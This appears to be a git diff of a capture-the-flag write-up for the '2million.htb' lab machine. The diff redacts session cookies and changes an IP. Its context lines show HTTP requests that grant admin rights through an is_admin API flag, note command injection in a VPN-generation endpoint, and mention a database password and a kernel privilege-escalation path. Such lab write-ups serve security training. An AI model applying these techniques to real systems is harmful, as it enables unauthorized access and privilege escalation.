@@ -132,7 +132,7 @@ Server: nginx
 Date: Sun, 23 Aug 2026 19:09:59 GMT
 Content-Type: application/json
 Connection: keep-alive
-Set-Cookie: PHPSESSID=e592cmtbr0496miq23if1fg3nq; path=/
+Set-Cookie: PHPSESSID=<REDACTED>; path=/
 Expires: Thu, 19 Nov 1981 08:52:00 GMT
 Cache-Control: no-store, no-cache, must-revalidate
 Pragma: no-cache
@@ -178,7 +178,7 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://2million.htb/home/access
 Accept-Encoding: gzip, deflate, br
-Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
+Cookie: PHPSESSID=<REDACTED>
 Connection: keep-alive
 ```
 We'll investigate the `/api` directory: 
@@ -193,7 +193,7 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://2million.htb/home/access
 Accept-Encoding: gzip, deflate, br
-Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
+Cookie: PHPSESSID=<REDACTED>
 Connection: keep-alive
 ```
 
@@ -247,7 +247,7 @@ Next, we accessed the `/api/v1/admin/settings/update` endpoint:
 ```http
 PUT /api/v1/admin/settings/update HTTP/1.1
 Host: 2million.htb
-Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
+Cookie: PHPSESSID=<REDACTED>
 Content-Type: application/json
 Content-Length: 2
 ```
@@ -270,7 +270,7 @@ We provided our registered email:
 ```http
 PUT /api/v1/admin/settings/update HTTP/1.1
 Host: 2million.htb
-Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
+Cookie: PHPSESSID=<REDACTED>
 Content-Type: application/json
 Content-Length: 31
 
@@ -300,7 +300,7 @@ The response indicated that the `is_admin` parameter was required. We therefore 
 ```http
 PUT /api/v1/admin/settings/update HTTP/1.1
 Host: 2million.htb
-Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
+Cookie: PHPSESSID=<REDACTED>
 Content-Type: application/json
 
 {
@@ -329,7 +329,7 @@ We can therefore use the newly obtained administrative privileges to access the 
 ```http
 POST /api/v1/admin/vpn/generate HTTP/1.1
 Host: 2million.htb
-Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
+Cookie: PHPSESSID=<REDACTED>
 Content-Type: application/json
 Content-Length: 2
 ```
@@ -355,7 +355,7 @@ After some time, we discovered that `username` parameter was vulnerable to comma
 ```http
 POST /api/v1/admin/vpn/generate HTTP/1.1
 Host: 2million.htb
-Cookie: PHPSESSID=u6ee2uq1jctvnq2dpt5u56edc8
+Cookie: PHPSESSID=<REDACTED>
 Content-Type: application/json
 Content-Length: 24
 
@@ -408,7 +408,7 @@ DB_PASSWORD=SuperDuperPass123
 
 **SSH Authentication:**
 ```
-ssh admin@10.129.229.66
+ssh admin@10.129.84.146
 ```
 **Result:**
 ```
@@ -424,6 +424,7 @@ admin@2million:~$ cat user.txt
 **Sources:** 
 [https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/
 )
+
 [https://nvd.nist.gov/vuln/detail/CVE-2026-68448](https://nvd.nist.gov/vuln/detail/CVE-2026-68448)
 
 While enumerating the system as the `admin` user, we discovered an email in `/var/mail/admin` containing information about an OS upgrade and mentioning a potentially serious **OverlayFS / FUSE Linux kernel vulnerability**.
